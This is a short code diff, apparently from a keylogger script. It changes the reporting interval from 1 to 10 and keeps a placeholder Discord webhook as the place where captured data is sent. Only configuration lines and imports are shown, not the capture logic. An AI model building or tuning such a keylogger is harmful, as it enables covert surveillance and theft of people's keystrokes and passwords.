@@ -3,7 +3,7 @@ from threading import Timer
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-SEND_REPORT_EVERY = 1
+SEND_REPORT_EVERY = 10
 WEBHOOK = "Put_your_webhook_here"
 
 class Keylogger: 
